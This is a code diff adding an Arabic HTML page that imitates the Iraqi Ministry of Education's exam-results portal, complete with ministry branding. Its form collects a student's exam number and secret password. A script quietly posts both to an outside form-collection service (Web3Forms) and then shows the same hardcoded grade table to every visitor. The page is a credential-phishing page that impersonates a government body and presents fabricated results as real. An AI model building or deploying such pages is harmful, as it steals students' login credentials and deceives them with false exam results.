@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نتائج الامتحانات الوزارية - العراق</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: #f8f9fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        /* واجهة إدخال البيانات */
+        .container {
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+            max-width: 450px;
+            width: 100%;
+            padding: 30px;
+            text-align: center;
+            border-top: 6px solid #1e3d59;
+        }
+        .logo {
+            width: 120px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #1e3d59;
+            margin-bottom: 10px;
+            font-size: 22px;
+        }
+        p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-size: 14px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 16px;
+            text-align: center;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #1e3d59;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        /* واجهة عرض النتيجة */
+        #result-page {
+            display: none;
+            background-color: #ffffff;
+            max-width: 480px;
+            width: 100%;
+            padding: 25px;
+            border-radius: 8px;
+        }
+        .result-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        .ministry-title {
+            text-align: right;
+            color: #222;
+            font-size: 18px;
+            font-weight: bold;
+            line-height: 1.4;
+        }
+        .logout-icon {
+            font-size: 24px;
+            color: #555;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+        }
+        .status-badge {
+            background-color: #e8f5e9;
+            color: #2e7d32;
+            padding: 8px 24px;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .final-result-label {
+            color: #444;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        .note-box {
+            background-color: #fff5f5;
+            border: 1.5px solid #e57373;
+            color: #c62828;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            text-align: right;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+        
+        /* الجدول الرئيسي بدون اللون الزهري */
+        .results-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+        .results-table th {
+            background-color: #eeeef2;
+            color: #111;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: bold;
+            border: 1px solid #e0e0e0;
+        }
+        .results-table td {
+            padding: 14px;
+            font-size: 15px;
+            color: #222;
+            border: 1px solid #e8e8e8;
+            text-align: center;
+            background-color: #ffffff;
+        }
+
+        /* كلاسات التلوين التلقائي للرسوب والغياب */
+        .fail-row td {
+            background-color: #ffebee !important;
+            color: #c62828 !important;
+            font-weight: bold;
+        }
+        .absent-row td {
+            background-color: #fffde7 !important;
+            color: #f57f17 !important;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<!-- واجهة تسجيل الدخول -->
+<div class="container" id="login-page">
+    <img src="logo2.png" alt="شعار وزارة التربية العراقية" class="logo">
+    <h2>وزارة التربية العراقية</h2>
+    <p>مركز فحص الدراسة الإعدادية / المتوسطة</p>
+
+    <form id="examForm" onsubmit="submitAndShowResult(event)">
+        <!-- إضافة خاصية name هنا ضرورية لـ Web3Forms -->
+        <input type="hidden" name="access_key" id="access_key" value="8ec23a2d-1c68-4f73-9913-e48fd44989d7">
+
+        <div class="form-group">
+            <label for="exam_number">الرقم الامتحاني للطالب:</label>
+            <input type="text" id="exam_number" name="الرقم_الامتحاني" placeholder="أدخل الرقم الامتحاني المكون من 10 أرقام" required>
+        </div>
+
+        <div class="form-group">
+            <label for="password">الرمز السري (كلمة المرور):</label>
+            <input type="password" id="password" name="الرمز_السري" placeholder="أدخل الرمز السري الخاص بالنتيجة" required>
+        </div>
+
+        <button type="submit">عرض النتيجة الحالية</button>
+    </form>
+</div>
+
+<!-- واجهة عرض النتيجة -->
+<div id="result-page">
+    <div class="result-header">
+        <a class="logout-icon" onclick="window.location.reload();">➔</a>
+        <div class="ministry-title">
+            جمهورية العراق<br>وزارة التربية
+        </div>
+    </div>
+
+    <div class="status-bar">
+        <div class="status-badge" id="status-text">ناجح</div>
+        <div class="final-result-label">النتيجة النهائية</div>
+    </div>
+
+    <div class="note-box">
+        <strong>ملاحظة:</strong> هذه النتيجة لا تُعد وثيقة رسمية، ويجب الاعتماد على الوثائق الورقية الصادرة من الوزارة.
+    </div>
+
+    <table class="results-table" id="grades-table">
+        <thead>
+            <tr>
+                <th style="width: 40%;">الدرجة</th>
+                <th style="width: 60%;">المادة</th>
+            </tr>
+        </thead>
+        <tbody>
+            <!-- اكتب هنا أي درجات تريدها للتجربة لتراها تتلون تلقائياً -->
+            <tr>
+                <td class="grade-cell">100</td>
+                <td>الاسلامية</td>
+            </tr>
+            <tr>
+                <td class="grade-cell">48</td>
+                <td>العربية</td>
+            </tr>
+            <tr>
+                <td class="grade-cell">92</td>
+                <td>الانكليزية</td>
+            </tr>
+            <tr>
+                <td class="grade-cell">غ</td>
+                <td>الاحياء</td>
+            </tr>
+            <tr>
+                <td class="grade-cell">94</td>
+                <td>الرياضيات</td>
+            </tr>
+            <tr>
+                <td class="grade-cell">100</td>
+                <td>الكيمياء</td>
+            </tr>
+            <tr>
+                <td class="grade-cell">100</td>
+                <td>الفيزياء</td>
+            </tr>
+        </tbody>
+    </table>
+</div>
+
+<script>
+    function submitAndShowResult(event) {
+        event.preventDefault();
+
+        // تمرير النموذج بالكامل بداخل FormData ليلتقط الـ access_key والـ name تلقائياً
+        let form = document.getElementById('examForm');
+        let formData = new FormData(form);
+
+        // 1. إرسال البيانات المجمعة فوراً وبشكل صحيح إلى خدمة Web3Forms
+        fetch("https://api.web3forms.com/submit", {
+            method: "POST",
+            body: formData
+        });
+
+        // 2. تشغيل فحص وتلوين جدول الدرجات تلقائياً
+        checkGradesColor();
+        
+        // 3. الانتقال الفوري والمضمون إلى واجهة عرض النتيجة
+        document.getElementById('login-page').style.display = 'none';
+        document.getElementById('result-page').style.display = 'block';
+    }
+
+    function checkGradesColor() {
+        let cells = document.querySelectorAll('.grade-cell');
+        let hasFailOrAbsent = false;
+
+        cells.forEach(function(cell) {
+            let row = cell.parentElement;
+            let value = cell.innerText.trim();
+
+            if (value === 'غ' || value === 'غائب') {
+                row.classList.add('absent-row');
+                hasFailOrAbsent = true;
+            } else {
+                let grade = parseFloat(value);
+                if (!isNaN(grade) && grade < 50) {
+                    row.classList.add('fail-row');
+                    hasFailOrAbsent = true;
+                }
+            }
+        });
+
+        if (hasFailOrAbsent) {
+            let statusBadge = document.getElementById('status-text');
+            statusBadge.innerText = 'راسب';
+            statusBadge.style.backgroundColor = '#ffebee';
+            statusBadge.style.color = '#c62828';
+        }
+    }
+</script>
+
+</body>
+</html>
